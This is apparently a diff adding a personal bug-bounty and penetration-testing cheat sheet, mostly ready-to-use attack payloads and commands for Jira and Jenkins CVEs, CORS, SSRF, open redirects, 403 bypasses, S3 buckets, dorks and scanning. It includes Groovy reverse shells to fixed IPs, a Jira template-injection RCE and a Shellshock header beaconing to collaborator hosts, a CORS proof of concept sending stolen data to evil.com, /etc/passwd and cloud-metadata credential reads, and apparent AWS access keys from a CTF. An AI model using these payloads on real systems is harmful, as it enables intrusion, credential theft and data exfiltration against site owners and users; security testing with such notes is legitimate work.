+        POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: JIRA ...   => CVE-2019-3396
+        	
+        {"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}
+        ----------------------------
+        /secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
+        /secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
+        /plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
+        /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+        -------------------------------
+        username enumeration => CVE-2019-3403
+        /rest/api/2/user/picker?query=admin
+        /rest/api/2/dashboard?maxResults=100
+        /rest/api/2/dashboard/FUZZ from 1-20000
+        /rest/api/3/mypermissions
+        /rest/api/2/mypermissions
+        curl https://jira.some.example.com/rest/api/2/mypermissions | jq | grep -iB6 '"havePermission": true'
+        -------------------------------
+        /rest/dashboards/1.0/10000/gadget/<GadgetId>/prefs  => Brute force 10,000 to 20,000 => CVE-2020-36287
+        -------------------------------
+        CVE-2019-8442
+        /s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+        -------------------------------
+        CVE-2019-8449
+        /rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
+        -------------------------------
+        SSRF- CVE-2019-8451
+        http://vulnerablehost.com/plugins/servlet/gadgets/makeRequest?url=http://vulnerablehost.com@http://burpcollab.net
+        -----------------------------------
+        /secure/ContactAdministrators!default.jspa   => CVE-2019–11581   => [**Site](https://hackerone.com/reports/706841)** 
+        in `subject` and `request details` put 
+        $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://burpcollab.net/rcetest?a=a').waitFor()
+        ------------------------------------
+        /_/;/WEB-INF/web.xml
+        /_/;/WEB-INF/decorators.xml
+        /_/;/WEB-INF/classes/seraph-config.xml
+        /_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+        /_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
+        /_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+        /_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
+        /_/%3B/WEB-INF/web.xml
+        /_/%3B/WEB-INF/decorators.xml
+        /_/%3B/WEB-INF/classes/seraph-config.xml
+        /_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+        /_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
+        /_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+        /_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
+        -------------------------------------
+        https://github.com/assetnote/jira-mobile-ssrf-exploit => CVE-2022-26135
+        -------------------------------------
+        Resources: https://github.com/UGF0aWVudF9aZXJv/Atlassian-Jira-pentesting
+        ```
+        
+    - jenkenis
+        
+        **Jenkins CVE-2024-23897** 
+        `java -jar jenkins-cli.jar -s <http://localhost:8080/> -http help 1 "@/etc/passwd"`
+        
+        `java -jar jenkins-cli.jar -s <http://localhost:8080/> -http connect-node 1 "@/etc/passwd"`
+        
+        ```jsx
+        /script then you add that code inside textbox (Command injection) 
+        
+        def cmd = 'id'
+        def sout = new StringBuffer(), serr = new StringBuffer()
+        def proc = cmd.execute()
+        proc.consumeProcessOutput(sout, serr)
+        proc.waitForOrKill(1000)
+        println sout
+         -------------------------------------------------------
+         and go to linux machine 
+         nc -nlvp 8888 
+         and 
+        r = Runtime.getRuntime()
+        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8888;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+        p.waitFor()
+        
+        // Linux
+        String host="10.10.16.4";
+        int port=8888;
+        String cmd="/bin/bash";
+        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+         
+         
+        ```
+        
+    - Firebase
+        
+        [vuln-domain.firebaseio.com/.json](http://vuln-domain.firebaseio.com/.json)
+        
+    - IAM enum
+        
+        ```json
+        if found aws  credentials  and need to validate 
+        https://github.com/andresriancho/enumerate-iam
+        ```
+        
+    - [MuraCMS](https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS)
+    - phpBB
+            [](https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS)
+        
+        once you found search.php then try to fuzz the CVE-2019-9826  by ffuf -u https://example.com/search.php?keyword=FUZZ and that would lead to DOS attack via service 
+        
+    - splunk
+        
+        ```jsx
+        /en-US/splunkd/_raw/services/server/info/server-info?output_mode=json
+        ```
+        
+    - angularJS
+        
+        ```powershell
+        1- open javascript files and if found angularJS files then it is angular
+        try {5*555} in all inputs and if yes then 
+        {{constructor.constructor('alert(1)')()} }
+        2- 
+        ```
+        
+    
+- **Check Local Storage**
+    
+    ```jsx
+    - check local storage for constant values even after logining out 
+    - if the token in the link stored inside localstoarge  try to inject it with any 
+    word and see if this word is injected inside local stoage => https://example.com?token=hacker
+    
+    ```
+    
+- **EXIF Geolocation Data Not Stripped From Uploaded Images**
+    
+    ```json
+    1- upload image in site profile 
+    2- download the same image and test it on https://jimpl.com/ to see if exif data is still found or stripped
+    ```
+    
+- **Fuzz**
+    - dirsearch and ffuf  and kitrunner
+        
+        ```jsx
+        port Fuzzing? : http://ip:FUZZ 
+        dirsearch -u https://example.com/inspector/
+        dirsearch -l target.txt --deep-recursive
+        dirsearch -u https://www.example.com
+         -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+        
+        dirsearch -u https://wms-us.tiktok.com/ -i 200,302  -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404,403,429 --follow-redirects --delay=0.1
+        
+        dirsearch -l $(pwd)/httpx (full path)
+        ffuf -u https://www.example.com/FUZZ -w wordlists -t 1000
+        kr scan -u https://www.example.com -w wordlist.kite
+        /000~ROOT~000/
+        docker-composer.yaml
+        ```
+        
+- **Static Page**
+    
+    ```json
+    1- Directory/File bruteforcing discovering exposed info , login forms, Senstive files
+    2- Checking the Source Code and JS Files
+    3- port scanning and services 
+    4- checking the version of servers 
+    4- 
+    ```
+    
+- **Cors exploit**
+    
+    ```json
+    cat httpx| httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: [evil.com](http://evil.com/)" {} | [[ $(grep -c "[evil.com](http://evil.com/)") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] \033[0m{}"' 2>/dev/null
+    ```
+    
+    - check response when putting origin: https://hossamshady.me and origin: null
+    
+    ```jsx
+    <html>
+    <body>
+    <center>
+    <h2>CORS POC Exploit</h2>
+    <h3>Extract SID</h3>
+    <div id="demo">
+    <button type="button" onclick="cors()">Exploit</button>
+    </div>
+    <script>
+    function cors() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+    };
+    xhttp.open("GET", "[https://██████](https://xn--4zhaaaaa/)", true);
+    xhttp.withCredentials = true;
+    xhttp.send();
+    }
+    </script>
+    </body>
+    </html>
+    ```
+    
+    - bypass cors
+    
+    ```jsx
+    <!DOCTYPE html>
+    <html>
+    <body>
+    <center>
+    <h3>Steal customer data!</h3>
+    <html>
+    <body>
+    <button type='button' onclick='cors()'>Exploit</button>
+    <p id='demo'></p>
+    <script>
+    function cors() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var a = this.responseText; // Sensitive data from niche.co about user account
+    document.getElementById("demo").innerHTML = a;
+    xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
+    xhttp.withCredentials = true;
+    console.log(a);
+    xhttp.send("data="+a);
+    }
+    };
+    xhttp.open("GET", "https://██████/wp-json/", true);
+    xhttp.withCredentials = true;
+    xhttp.send();
+    }
+    </script>
+    </body>
+    </html>
+    
+    bypass Origin restrictions 
+    remove Origin 
+    Origin: https://www.attacker.tld
+    Origin: http://vuln-bank.tld
+    Origin: null
+    Origin: https://vuln-bank.tld.www.attacker.tld
+    Origin: https://vuln-bank.tldwww.attacker.tld
+    Origin: https://subdomain.vuln-bank.tld
+    Origin: https://vuln-bank.tl
+    Origin: https://vuln-bank.tld_www.attacker.tld
+    Origin: https://subdomainvuln-bank.tld
+    Origin: https://burpcollab.com
+    Origin: hacker.com?.victim.com
+    Origin: example.com.hacker.com
+    Origin: wwwexample.com
+    Origin: hacker.com/example.com
+    Origin: mydomain.com%25%32%33@www.example.com
+    Origin: mydomain.com%23@www.example.com
+    ```
+    
+- **ClickJacking**
+    
+    https://addons.mozilla.org/en-US/firefox/addon/click-jacking/
+    
+    ```jsx
+    <iframe src=https://example.com/x ></iframe>
+    ```
+    
+- **Broken link Hijacking**
+    - Search for all social media links
+    - blc -rof --filter-level 3 https://example.com/
+    
+    ```jsx
+    https://ahrefs.com/broken-link-checker	online checker
+    https://www.deadlinkchecker.com/ 	online checker
+    https://brokenlinkcheck.com/ 		online checker
+    ```
+    
+- **Open redirect**
+    
+    bypass open redirect: uri=°/[https://evil.com](https://evil.com/)
+    
+    `http://;@google.com`
+    
+    ---
+    
+    ?redirect=https://target.com
+    
+    ?redirect=[https://google.comğ.target.com](https://t.co/uykdZ9l1q9)
+    
+    > "Ğ" is a Turkish character, server can't render it and changes it to "?"
+    So it redirects to [http://google.com/?target.com](https://t.co/6zdkgjlbNp)
+    
+    https://victim.com/.evil.com → victim.com.evil.com
+    
+    http:example.com ⇒ http://example.com
+    
+    ```jsx
+    httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302 
+    ```
+    
+- **SSRF**
+    
+    ```json
+    https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Ben-Sadeghipour-Owning-the-clout-through-SSRF-and-PDF-generators.pdf
+    ##1 Host: burpcollab.com
+    ##2 GET https://burpcollab.com/ HTTP/1.1
+    ##3 GET https://burpcollab.com HTTP/1.1
+    ##4 SSRF in flask GET @burpcollab.com HTTP/1.1 or @169.254.169.254
+    ##5 SSRF on Spring Boot GET ;@burpcollab.com HTTP/1.1
+    ##6 X-Forwarded-For: hossam@site.com  => make sure 302 and location is hossam@site.com
+    ##7 change the file name to https://burpcollab.com
+    --------
+    ssrf via x-forwarded-for :
+    1- change http to http 1.0 
+    change get to POST and MIME type to txt
+    -----------------------------------------------
+    http://169.254.169.254/latest/dynamic/instance-identity/document 
+    http://169.254.169.254/latest/meta-data/iam/security-credential
+    ------------------------------------------------
+    Time Based ssrf  (try to put valid url and not valid url ) and see the time response
+    <html>
+        <body>
+            <b>Time-Based Blind SSRF</b>
+            <img src="http://blah.nonexistent.com">
+        </body>
+    </html>
+    --------------------------------
+    bypass ssrf restrictions 
+    
+        Localhost Address Block: 127.0.0.0 - 127.255.255.255
+        Shortened IP Adress: 127.1
+        Prolonged IP Address: 127.000000000000000.1
+        All Zeroes: 0.0.0.0
+        Shortened All Zeroes: 0
+        Decimal Representation: 2130706433
+        Octal Representation: 0177.0000.0000.0001
+        Hex Representation: 0x7f000001
+        IPv6 loopback address: 0:0:0:0:0:0:0:1 (also ::1)
+        IPv4-mapped IPv6 loopback address: ::ffff:127.0.0.1
+        -------------------------
+        bypass ssrf restriction with redirection 
+        https://hossamshady.com/file.php => file.php 
+        <?php header('Location: http://127.0.0.1/debug'); ?>
+    
+    1- cat allUrls.txt | grep "=" | qsreplace http://troupga5ke78yjdu4hv12s1v2m8dw3ks.oastify.com > ssrf.txt
+    2- cat ssrf.txt | httpx -fr
+    
+    cloud paths :
+    https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b
+    
+    -------------------------------------------
+    https://exmaple.com/?url=https://collab.com
+    https://example.com?url=//collab.com
+    https://example.com?url=collab.com
+    https://example.com?url=/path/to/something/here
+    https://example.com?url=file:///etc/passwd
+    http://acme.com/ssrf.php?url=tftp://evil.com:12346/TESTPACKET
+    ```
+    
+    - Search for =http or params in logger++ burpsuite
+    - User-Agent: () { :; }; /usr/bin/nslookup $(whoami).unldzhm29u3ffkw9p78yoytv4madydm2.oastify.com
+    - [https://partners.redmart.com/adm/krgourl.php?DOCUMENT_ROOT=https://()](https://partners.redmart.com/adm/krgourl.php?DOCUMENT_ROOT=https://()) { :; }; /usr/bin/nslookup $(whoami).unldzhm29u3ffkw9p78yoytv4madydm2.oastify.com
+    - use surf from assetnote
+- **Http methods**
+    - Use intruder to test all methods for every function
+- **Command Injection**
+    
+    ```jsx
+    ls%0awho'a'm'i
+    ls%0awho"a"m"i
+    who$@ami    => linux
+    w\ho\am\i   => linux
+    who^ami     => windows
+    WHOAMI
+    WhOaMi
+    
+    ```
+    
+- **Json**
+    
+    ```jsx
+    {"id":111} ⟶ 401 Unauthriozied
+    {"id":{"id":111}} ⟶ 200 OK
+    {"username": "John"}
+    {"username": true}
+    {"username": null}
+    {"username": 1}
+    {"username": [true]}
+    {"username": ["John", true]}
+    {"username": {"$neq": "lalala"}}
+    Content-Type: application/json {“user_id”:<attacker_id>,”user_id”:<victim’s_id>}
+    -------------
+    GET /api_v1/messages?user_id=VICTIM_ID ⟶ 401
+    GET /api_v1/messages?user_id=attack&user_id=VICTIM ⟶ 200 OK
+    --------
+    POST REQUEST WITH 
+    **{"<img onerror=confirm(1337) src/>"  :1 }**
+    
+    ```
+    
+    Content-Type: application/json {“user_id”:<attacker_id>,”user_id”:<victim’s_id>}
+    
+    Content-Type: application/json {“user_id”:<attacker_id>,”user_id”:<victim’s_id>}
+    
+    - change v3 to v2 to v1
+    - 
+- **S3 Bucket**
+    
+    ```json
+    - search in burp history with => (s3-|s3\.)?(.*)\.amazonaws\.com
+    - **http://s3.amazonaws.com/[bucket_name]/
+    - http://[bucket_name].s3.amazonaws.com/
+    - check CNAMES might => zzz.amazonaws.com
+    - visit https://buckets.grayhatwarfare.com and check open public buckets**
+    once you found s3 bucket test => [s3bucket.s3.amazonaws.com](http://s3bucket.amazonaws.com/)
+    ```
+    
+    - find bucket by first (if no result try many times )
+    
+    ```json
+    dig +nocmd flaws.cloud any +multiline +noall +answer
+    ```
+    
+    - after that go to all ips appeared and if redirected you to https://aws.amazon.com/s3/ then hosted
+    
+    ```json
+    nslookup flaws.cloud  # and you will see the region and bucket 
+    aws s3  ls s3://example.com --no-sign-request  --region us-west-2
+    aws s3 ls s3://bucketname --no-sign-request
+    (if permission denied then try to configure your profile )
+     # aws configure --profile hossamshady101  => then enter your aws secret key and access key
+     (if you can't get the region then use (cyberduck.io) it will get region of bucket)
+      0-  aws s3 ls s3://example.com --profile=hossamshady101 --region us-west-2 
+      1-  aws s3 cp hossam.svg s3://bucketname --acl public-read
+      2-  download files from it it by # aws s3 cp s3://s3bucket/file.zip ./
+      3-  takeover it when seeing "The specified bucket does not exist"
+      4-  aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+     access key => (AKIA3GNH2VSDOUJCZ7XN) 
+     secret key (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)
+     region (us-east-1)
+     -------------------------
+     once you found .git while broswing s3 bucket in firefox or in list then try 
+    # aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+    # git log
+    # git checkout <hash>   => (hash found in log file)
+    if gained access_key and secret key configure profile and then 
+    # aws --profile flaws sts get-caller-identity
+    # aws --profile flaws  ec2 describe-snapshots --owner-id <owner_id>
+    
+     -------------------------------
+     alway try to extract internal info of images 
+     # steghide extract -sf  image.jpg   => this image was inside the bucket although 
+     it is forbidden to access the bucket but image can give senstive info 
+     
+     when accessing the bucket if 403 then try https://xxx.s3.amazonaws.com/?versions
+     it will give you all previous versions of bucket 
+     once you got the versions Id 
+     https://xxx.s3.amazonaws.com/index_v1.html?versionId=xxxxxxxxxxxx
+       https://xxx.s3.amazonaws.com/index_v2.html?versionId=xxxxxxxxxxxx
+       https://xxx.s3.amazonaws.com/index_v3.html?versionId=xxxxxxxxxxxx
+        https://xxx.s3.amazonaws.com/index_v4.html?versionId=xxxxxxxxxxxx
+         https://xxx.s3.amazonaws.com/index_v5.html?versionId=xxxxxxxxxxxx
+          https://xxx.s3.amazonaws.com/styles.css?versionId=xxxxxxxxxxxx
+          
+          
+          https://0mr.me/ctf/csaw-ctf-2024-quals/bucketwars/
+    ```
+    
+    ```json
+    
+        ^[a-z0-9\.\-]{0,63}\.?s3.amazonaws\.com$
+        ^[a-z0-9\.\-]{0,63}\.?s3-website[\.-](eu|ap|us|ca|sa|cn)-\w{2,14}-\d{1,2}\.amazonaws.com(\.cn)?$
+        ^[a-z0-9\.\-]{0,63}\.?s3[\.-](eu|ap|us|ca|sa)-\w{2,14}-\d{1,2}\.amazonaws.com$
+        ^[a-z0-9\.\-]{0,63}\.?s3.dualstack\.(eu|ap|us|ca|sa)-\w{2,14}-\d{1,2}\.amazonaws.com$
+    
+    ```
+    
+    ```json
+    169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
+    169.254.169.254/latest/meta-data/iam/info
+    --------------------------------------------
+    Cloud firebase found Databaeurl 
+    curl "https://<Database_url>/poc1.json" -XPUT -d '{"attacker":"maliciousdata"}'
+    ```
+    
+    # 
+    
+- **Cloud Hacking**
+    
+    ```powershell
+    1- try to upload image and if uploaded on google cloud then 
+    2- would be as https://storage.googleapis.com/input-bucket-<random_bucket>/image.jpg
+    3- # gsutil ls -r gs://<input-bucket-<random_bucket>/**  
+    4- # gsutil cp gs://<BUCKET NAME>/flag.txt .
+    -> if failed then monitor the network from inspect then search for the key inside file called 
+    "save-content" and then take that key and 
+    5- gsutil -o "GSUtil:decryption_key1=PaUlOnL2/CsVmunL7H1GvT2zgD+/Eu8Si8GTUOdY9n0="  cp gs://<BUCKET NAME>/flag.txt .
+    6- 
+    
+    ```
+    
+- **Source Code review**
+    - check robots.txt
+    - in source code search for name= to grep the parameters
+    - in javascript file search for / to grep the paths
+- **Github Search**
+    
+    ```json
+    org: example s3.amazonaws.com
+    search in burpsuite before closing s3.amazonaws.com
+    "api_key" , "apiKey" , "api key" "api-key" "API-KEY" "token" "API_KEY"
+    ```
+    
+- **Google Dorks**
+    
+    ```json
+    site:example[.]com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3
+    site:*.example.com inurl:.aspx
+    inurl:component/content/
+    inurl:component/content/?view=featured&format=feed&type=atom
+    inurl:index.php/using-joomla/extensions/modules/ intext:joomla! 1.7
+    inurl:index.php/using-joomla/extensions/modules/19-sample-data-articles/joomla/50-upgraders
+    inurl:using-joomla/extensions/templates/beez5/home-page-beez5
+    inurl:index.php?format=feed&type=rss
+    inurl:index.php/using-joomla/extensions/plugins?format=feed&type=rss
+    inurl:index.php?format=feed&type=atom
+    intext:"joomla! 1.7 - Open Source Content Management"
+    intext:"joomla! 1.6 - Open Source Content Management"
+    intext:Joomla 1.6 inurl:index.php/login
+    intext:Joomla 1.7 inurl:index.php/login
+    intext:Joomla 1.6 inurl:index.php/registration
+    intext:Joomla 1.7 inurl:index.php/registration
+    inurl:index.php/plugins site:
+    inurl:index.php/rss=feed site:
+    intext:"index of /.git"
+    site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp
+    site:..edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
+    site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com | link:www.hackerone.com | link:www.slack.com | link:www.github.com
+    inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
+    inurl:/geoserver/ows?service=wfs
+    site:*.* AND (ext:backup OR ext:bak OR ext:old)
+    inurl:"/wp-json/wp/v2/users"	==> all api for wordpress
+    inurl:"/includes/api" intext:"index of /"  find api dir
+    intitle:"index.of" intext:"api.txt"  ==> find api key files
+    ext:php inurl:"api.php?action="		==> sql injection
+    intitle:"index of" api_key OR "api key" OR apiKey -pool 
+    
+    ```
+    
+- **Information Discloure**
+    
+    [https://target_name.service-now.com/kb_view_customer.do?sysparm_article=KB001](https://target_name.service-now.com/kb_view_customer.do?sysparm_article=KB0011234)XXXX and fuzz  xxxx with intruder , put target_name as [mars.service-now.com](http://mars.service-now.com)  
+    
+    ```json
+    ##0 
+    
+    -----------------------------------------------------------------------
+    ##1 
+    if there limit for input ex:100 try to put 140 and check response may discloure 
+    -----------------------------------------------------------------------
+    ##2
+    check 
+    /api/v1/resourses/books?show=/etc/passwd
+    /app.js
+    /.config/karama.conf.js
+    /webmail/vendor/composer/installed.json
+    /cgi-bin/printenv
+    /app_dev.php 
+    /api/user/info
+    /wp-config.php.bak 
+    /_profiler
+    /app_dev.php/_profiler/
+    /app_dev.php/_profiler/phpinfo and check technology if "symfony" exploit it with app_dev.php/profiler/ => search
+    -----------------------------------------------------------------------
+    ##2
+    try to make errors by changing the parameters and see response info
+    httpx -l domains.txt --status-code --title -path /phpinfo.php | grep 'phpinfo()'
+    -----------------------------------------------------------------------
+    https://example.com/docs
+    https://example.com/api/docs
+    https://docs.example.com
+    https://dev.example.com/docs
+    https://developer.example.com/docs
+    https://api.example.com/docs
+    https://example.com/developers/documentation
+    -----------------------------------------------------------------------
+    
+    GET /assets/css///////../../../../../../../../etc/passwd
+    https://example.com/api/geojson?url=file:///etc/passwdUser 
+    GET /path\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd%3F.js
+    One way to find information disclosure vulnerabilities is to change the header.
+    Change the Accept header to:
+    Accept: application/json, text/javascript, */*; q=0.01
+    Some vulnerable servers reveal server version information, stack and route information
+    --------------------------------------------------------
+    http://censys.io
+    and look for subdomains. look for 3306 port in scope
+    if there is such port then open the address you will find phpmyadmin panel at
+    http://site.com/phpmyadmin/
+    ip/phpmyadmin/
+    Above method i use to find phpmyadmin panel :)
+    ---------------------
+    important ports 
+    873 rsync search in medium to exploit it 
+    ---------------
+    
+    ```
+    
+- **Bypass 403**
+    
+    https://github.com/Dheerajmadhukar/4-ZERO-3.git
+    
+    ```json
+    ##bypass 403 by race condtion [here](https://amineaboud.medium.com/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125)
+    1- send request to intruder 300 requests , Number of threads 6,  number of retries on network failure 4
+    pause before retry 3000 (millisecond) and you can find one of them 200 OK 
+    ---------------------------------------
+    curl -X POST https://example.com/admin -H "Content-Length:0" 
+    -----------------------------------------
+    curl https://example.com/admin/settings => 403
+    curl https://example.com/admin/settings -H "Referer: http://exmaple.com/admin" => 200
+    
+    ---------------------------------------
+    
+    bypass php 
+    GET /admin.php => 403
+    GET /admin.php/file.php => when two files with same extension php will take only the 
+    first file and ignore all after / => will take only /admin.php
+    example.com/admin => 403
+    example.com/%2e/admin => 200
+    
+    **bypass node.js (nginx)**
+    GET /admin\x0a HTTP/1.1 => 200
+    Nginx   bypass
+    1.22.0	\xA0
+    1.21.6	\xA0
+    1.20.2	\xA0, \x09, \x0C
+    1.18.0	\xA0, \x09, \x0C
+    1.16.1	\xA0, \x09, \x0C
+    
+    **bypass flask (nginx)**
+    Nginx 	Flask Bypass Characters
+    1.22.0	\x85, \xA0
+    1.21.6	\x85, \xA0
+    1.20.2	\x85, \xA0, \x1F, \x1E, \x1D, \x1C, \x0C, \x0B
+    1.18.0	\x85, \xA0, \x1F, \x1E, \x1D, \x1C, \x0C, \x0B
+    1.16.1	\x85, \xA0, \x1F, \x1E, \x1D, \x1C, \x0C, \x0B
+    
+    **Nginx 	Spring Boot Bypass Characters**
+    1.22.0	;
+    1.21.6	;
+    1.20.2	\x09, ;
+    1.18.0	\x09, ;
+    1.16.1	\x09, ;
+    
+    POST / HTTP/1.1 
+    X-Original-URL: /admin/deleteUser
+    url.com/admin/?
+    url.com//admin//
+    url.com///admin///
+    url.com/./admin/./
+    url.com/admin?
+    url.com/admin??
+    url.com/admin??
+    url.com/admin/?/
+    url.com/admin/??
+    url.com/admin/??/
+    url.com/admin/..
+    url.com/admin/../
+    url.com/admin/./
+    url.com/admin/.
+    url.com/admin/.//
+    url.com/admin/*
+    url.com/admin//*
+    url.com/admin/%2f
+    url.com/admin/%2f/
+    url.com/admin/%20
+    url.com/admin/%20/
+    url.com/admin/%09
+    url.com/admin/%09/
+    url.com/admin/%0a
+    url.com/admin/%0a/
+    url.com/admin/%0d
+    url.com/admin/%0d/
+    url.com/admin/%25
+    url.com/admin/%25/
+    url.com/admin/%23
+    url.com/admin/%23/
+    url.com/admin/%26
+    url.com/admin/%3f
+    url.com/admin/%3f/
+    url.com/admin/%26/
+    url.com/admin/#
+    url.com/admin/#/
+    url.com/admin/#/./
+    url.com/./admin
+    url.com/./admin/
+    url.com/..;/admin
+    url.com/..;/admin/
+    url.com/.;/admin
+    url.com/.;/admin/
+    url.com/;/admin
+    url.com/;/admin/
+    url.com//;//admin
+    url.com//;//admin/
+    url.com/admin/./
+    url.com/%2e/admin
+    url.com/%2e/admin/
+    url.com/%20/admin/%20
+    url.com/%20/admin/%20/
+    url.com/admin/..;/
+    url.com/admin.json
+    url.com/admin/.json
+    url.com/admin..;/
+    url.com/admin;/
+    url.com/admin%00
+    url.com/admin.css
+    url.com/admin.html
+    url.com/admin?id=1
+    url.com/admin~
+    url.com/admin/~
+    url.com/admin/°/
+    url.com/admin/&
+    url.com/admin/-
+    url.com/admin\/\/
+    url.com/admin/..%3B/
+    url.com/admin/;%2f..%2f..%2f
+    url.com/ADMIN
+    url.com/ADMIN/
+    url.com/admin/..\;/
+    url.com/*/admin
+    url.com/*/admin/
+    url.com/ADM+IN
+    url.com/ADM+IN/
+    site.com/secret –> HTTP 403 Forbidden
+    site.com/SECRET –> HTTP 200 OK
+    site.com/secret/ –> HTTP 200 OK
+    site.com/secret/. –> HTTP 200 OK
+    site.com//secret// –> HTTP 200 OK
+    site.com/./secret/.. –> HTTP 200 OK
+    site.com/;/secret –> HTTP 200 OK
+    site.com/.;/secret –> HTTP 200 OK
+    site.com//;//secret –> HTTP 200 OK
+    site.com/secret.json –> HTTP 200 OK (ruby)
+    /%2e/path
+    /%252e/path
+    /%ef%bc%8fpath
+    //path
+    ```
+    
+- **shodan**
+    
+    ```json
+    `Ssl.cert.subject.CN:"[github.com](http://github.com/)"
+    “Ssl:apple.com” or “org:Apple Inc*” and “Ssl:apple”
+    “***title:grafana hostname:target***” you can also use ***http.title:grafana***
+    - ssl.cert.subject.CN:"gevme.com*" 200
+    - ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"
+    - ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
+    - Set-Cookie:"mongo-express=" "200 OK"
+    - ssl:"invisionapp.com" http.title:"index of / "
+    - ssl:"arubanetworks.com" 200 http.title:"dashboard"
+    - net:192.168.43/24, 192.168.40/24
+    hostname:"target.com" 
+    "content-type: application/xml"
+    "content-type: application/xml"
+    "200 OK" => add it to any query to get all requests with  successful responses 
+    "wp-json" => will search for wordpress api 
+    ```
+    
+    use [https://hunter.how](https://hunter.how/) instead
+    
+    ```json
+    get ips of target
+    # shodan search Ssl.cert.subject.CN:"hackerone" 200 --fields ip_str  | httpx
+    shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0
+    shodan search --fields ip_str,port,org,hostnames apache 
+    uncover -q "hackerone.com" -e censys,fofa,shodan,shodan-idb | httpx
+    calculate icon hash # fofax -iu https://www.baidu.com/favicon.ico -fs 5
+    ## to get all the favicon for all subs
+    subfinder -d http://canva.com | httpx -favicon -j | jq -r .favicon | grep -v null | sort -u
+    ```
+    
+- **Prototype Pollution**
+    
+    ```json
+    subfinder -d http://target.com | httpx -silent | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[NOT]"' | sed "s/(//g"|sed"s/)//g" | sed "s/JS//g" | grep "VULN"
+    ```
+    
+- **Port scan**
+    
+    ```json
+    nmap --script http-enum 192.233.344.11
+    port 2049 , 111 nfs share files
+    /usr/share/nmap/scripts/nfs-ls.nse
+    /usr/share/nmap/scripts/nfs-showmount.nse
+    /usr/share/nmap/scripts/nfs-statfs.nse
+    nmap --script nfs-ls,nfs-showmount,nfs-statfs <ip>
+    showmount -e <ip>      =>  to see what shared files for system 
+    mkdir -p /mnt/home/ali
